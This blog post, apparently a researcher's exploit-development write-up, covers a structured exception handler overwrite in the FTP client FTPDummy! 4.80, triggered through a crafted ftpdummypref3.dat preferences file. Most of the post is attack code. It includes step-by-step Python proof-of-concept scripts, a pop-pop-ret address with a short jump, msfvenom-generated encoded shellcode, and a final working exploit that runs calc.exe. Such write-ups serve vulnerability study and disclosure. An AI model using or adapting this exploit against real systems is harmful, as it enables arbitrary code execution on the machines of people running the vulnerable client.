---
layout: post
title: FTPDummy! 4.80 - Structured Exception handling
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug

FTPDummy! is an ftp client which suffers from a Structured Exception handling overwrite when a long string is introduced within ftpdummypref3.dat.

Directory listing:

![](/assets/img/Findings8/0.png)

### The crash

In order to portray the malicious file to be a .dat format, it needs some headers, which i modified from [here](https://www.exploit-db.com/exploits/32050).

PoC code:

```term
import struct

buffer = "\x31\x0d\x0a\x31\x0d\x0a" + "A" * 5000

try:
    f = open ("ftpdummypref3.dat", "w")
    f.write(buffer)
    f.close()
    print "[+] The file has been created successfully!"

except:
    print "[!] There has been an error while creating the file."
```

The file is generated within the FTPDummy! folder, so as to achieve	the hijicking of ftpdummypref3.dat:

![](/assets/img/Findings8/1.png)

PoC code:

```term
import struct

buffer = "\x31\x0d\x0a\x31\x0d\x0a" + "A" * 477 + "BBBB" + "CCCC" + "\xff" * 2000 

try:
    f = open ("ftpdummypref3.dat", "w")
    f.write(buffer)
    f.close()
    print "[+] The file has been created successfully!"

except:
      print "[!] There has been an error while creating the file."      
```

### Accessing the flow

The SEH values are overwritten as expected:

![](/assets/img/Findings8/2.png)

The modules are listed:

![](/assets/img/Findings8/3.png)

Despite the fact that the only possible PPR addresses contain a null-byte, this does not cause many issues, due to the fact that in cases like these in which files are being used, instead of sending the payload remotely or on text itself, such characters do not affect the chain that much.

![](/assets/img/Findings8/4.png)

Selecting the address:

![](/assets/img/Findings8/5.png)

PoC code:

```term
import struct

nseh = "\x70\x08\x71\x06"
seh = struct.pack("<I", 0x0044D078)

buffer = "\x31\x0d\x0a\x31\x0d\x0a" + "A" * 477 + nseh + seh + "\xff" * 2000 

try:
    f = open ("ftpdummypref3.dat", "w")
    f.write(buffer)
    f.close()
    print "[+] The file has been created successfully!"

except:
    print "[!] There has been an error while creating the file."
    
```

The SEH values are overwritten with the short-jump and the PPR address as expected, achieving an execution of \xff characters:

![](/assets/img/Findings8/5.png)

### Shellcode

As this scenario may contain different bad characters, being these for example 0a or 0d, i simply chose to use the x86/alpha_mixed encoder in order to use as less non-ASCII characters as possible.

```term
root@whitecr0wz:~/Exploit-Dev/hex# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 448 (iteration=0)
x86/alpha_mixed chosen with final size 448
Payload size: 448 bytes
Final size of py file: 2188 bytes
buf =  b""
buf += b"\x89\xe2\xda\xdf\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x59\x78\x6c"
buf += b"\x42\x33\x30\x63\x30\x37\x70\x55\x30\x6c\x49\x68\x65"
buf += b"\x74\x71\x6b\x70\x65\x34\x4e\x6b\x66\x30\x30\x30\x4c"
buf += b"\x4b\x36\x32\x76\x6c\x6e\x6b\x30\x52\x75\x44\x6c\x4b"
buf += b"\x32\x52\x55\x78\x66\x6f\x4f\x47\x53\x7a\x47\x56\x30"
buf += b"\x31\x69\x6f\x6c\x6c\x35\x6c\x55\x31\x73\x4c\x63\x32"
buf += b"\x66\x4c\x67\x50\x5a\x61\x4a\x6f\x34\x4d\x73\x31\x6f"
buf += b"\x37\x48\x62\x48\x72\x51\x42\x72\x77\x4e\x6b\x76\x32"
buf += b"\x34\x50\x6c\x4b\x30\x4a\x75\x6c\x6c\x4b\x30\x4c\x54"
buf += b"\x51\x61\x68\x7a\x43\x57\x38\x57\x71\x6a\x71\x46\x31"
buf += b"\x6c\x4b\x56\x39\x71\x30\x67\x71\x6b\x63\x6c\x4b\x70"
buf += b"\x49\x64\x58\x38\x63\x55\x6a\x43\x79\x6c\x4b\x46\x54"
buf += b"\x6c\x4b\x67\x71\x78\x56\x54\x71\x59\x6f\x6e\x4c\x5a"
buf += b"\x61\x58\x4f\x64\x4d\x46\x61\x39\x57\x47\x48\x6d\x30"
buf += b"\x34\x35\x78\x76\x46\x63\x51\x6d\x5a\x58\x55\x6b\x73"
buf += b"\x4d\x35\x74\x71\x65\x69\x74\x31\x48\x6e\x6b\x31\x48"
buf += b"\x47\x54\x55\x51\x6b\x63\x30\x66\x4c\x4b\x66\x6c\x32"
buf += b"\x6b\x4c\x4b\x71\x48\x35\x4c\x65\x51\x6a\x73\x6e\x6b"
buf += b"\x53\x34\x4c\x4b\x66\x61\x7a\x70\x4f\x79\x61\x54\x77"
buf += b"\x54\x55\x74\x71\x4b\x33\x6b\x70\x61\x52\x79\x43\x6a"
buf += b"\x76\x31\x49\x6f\x6d\x30\x43\x6f\x53\x6f\x73\x6a\x4c"
buf += b"\x4b\x72\x32\x7a\x4b\x6e\x6d\x31\x4d\x72\x4a\x65\x51"
buf += b"\x4c\x4d\x4f\x75\x4d\x62\x47\x70\x33\x30\x63\x30\x46"
buf += b"\x30\x71\x78\x64\x71\x6c\x4b\x72\x4f\x6f\x77\x49\x6f"
buf += b"\x58\x55\x6f\x4b\x4d\x30\x67\x6d\x55\x7a\x77\x7a\x35"
buf += b"\x38\x39\x36\x5a\x35\x4f\x4d\x6d\x4d\x79\x6f\x4e\x35"
buf += b"\x77\x4c\x53\x36\x61\x6c\x37\x7a\x6b\x30\x79\x6b\x79"
buf += b"\x70\x33\x45\x55\x55\x6f\x4b\x73\x77\x35\x43\x54\x32"
buf += b"\x72\x4f\x73\x5a\x73\x30\x71\x43\x79\x6f\x48\x55\x33"
buf += b"\x53\x55\x31\x50\x6c\x30\x63\x36\x4e\x55\x35\x33\x48"
buf += b"\x30\x65\x73\x30\x41\x41"
root@whitecr0wz:~/Exploit-Dev/hex# 
```

Finally, the shellcode is assembled with the final header as well:

Final PoC:

```term
import struct

nseh = "\x70\x08\x71\x06"
seh = struct.pack("<I", 0x0044D078)

# msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha_mixed EXITFUNC=thread 
#Payload size: 448 bytes

buf =  b""
buf += b"\x89\xe2\xda\xdf\xd9\x72\xf4\x5e\x56\x59\x49\x49\x49"
buf += b"\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += b"\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += b"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x59\x78\x6c"
buf += b"\x42\x33\x30\x63\x30\x37\x70\x55\x30\x6c\x49\x68\x65"
buf += b"\x74\x71\x6b\x70\x65\x34\x4e\x6b\x66\x30\x30\x30\x4c"
buf += b"\x4b\x36\x32\x76\x6c\x6e\x6b\x30\x52\x75\x44\x6c\x4b"
buf += b"\x32\x52\x55\x78\x66\x6f\x4f\x47\x53\x7a\x47\x56\x30"
buf += b"\x31\x69\x6f\x6c\x6c\x35\x6c\x55\x31\x73\x4c\x63\x32"
buf += b"\x66\x4c\x67\x50\x5a\x61\x4a\x6f\x34\x4d\x73\x31\x6f"
buf += b"\x37\x48\x62\x48\x72\x51\x42\x72\x77\x4e\x6b\x76\x32"
buf += b"\x34\x50\x6c\x4b\x30\x4a\x75\x6c\x6c\x4b\x30\x4c\x54"
buf += b"\x51\x61\x68\x7a\x43\x57\x38\x57\x71\x6a\x71\x46\x31"
buf += b"\x6c\x4b\x56\x39\x71\x30\x67\x71\x6b\x63\x6c\x4b\x70"
buf += b"\x49\x64\x58\x38\x63\x55\x6a\x43\x79\x6c\x4b\x46\x54"
buf += b"\x6c\x4b\x67\x71\x78\x56\x54\x71\x59\x6f\x6e\x4c\x5a"
buf += b"\x61\x58\x4f\x64\x4d\x46\x61\x39\x57\x47\x48\x6d\x30"
buf += b"\x34\x35\x78\x76\x46\x63\x51\x6d\x5a\x58\x55\x6b\x73"
buf += b"\x4d\x35\x74\x71\x65\x69\x74\x31\x48\x6e\x6b\x31\x48"
buf += b"\x47\x54\x55\x51\x6b\x63\x30\x66\x4c\x4b\x66\x6c\x32"
buf += b"\x6b\x4c\x4b\x71\x48\x35\x4c\x65\x51\x6a\x73\x6e\x6b"
buf += b"\x53\x34\x4c\x4b\x66\x61\x7a\x70\x4f\x79\x61\x54\x77"
buf += b"\x54\x55\x74\x71\x4b\x33\x6b\x70\x61\x52\x79\x43\x6a"
buf += b"\x76\x31\x49\x6f\x6d\x30\x43\x6f\x53\x6f\x73\x6a\x4c"
buf += b"\x4b\x72\x32\x7a\x4b\x6e\x6d\x31\x4d\x72\x4a\x65\x51"
buf += b"\x4c\x4d\x4f\x75\x4d\x62\x47\x70\x33\x30\x63\x30\x46"
buf += b"\x30\x71\x78\x64\x71\x6c\x4b\x72\x4f\x6f\x77\x49\x6f"
buf += b"\x58\x55\x6f\x4b\x4d\x30\x67\x6d\x55\x7a\x77\x7a\x35"
buf += b"\x38\x39\x36\x5a\x35\x4f\x4d\x6d\x4d\x79\x6f\x4e\x35"
buf += b"\x77\x4c\x53\x36\x61\x6c\x37\x7a\x6b\x30\x79\x6b\x79"
buf += b"\x70\x33\x45\x55\x55\x6f\x4b\x73\x77\x35\x43\x54\x32"
buf += b"\x72\x4f\x73\x5a\x73\x30\x71\x43\x79\x6f\x48\x55\x33"
buf += b"\x53\x55\x31\x50\x6c\x30\x63\x36\x4e\x55\x35\x33\x48"
buf += b"\x30\x65\x73\x30\x41\x41"

buffer = "\x31\x0d\x0a\x31\x0d\x0a" + "A" * 477 + nseh + seh + "A" * 5 + buf + "\xff" * 2000 + "\x0d\x0a\x7c\x31\x0d\x0a"

try:
    f = open ("ftpdummypref3.dat", "w")
    f.write(buffer)
    f.close()
    print "[+] The file has been created successfully!"

except:
    print "[!] There has been an error while creating the file."
    
    
```

# EndGame

![](/assets/img/Findings8/6.gif)
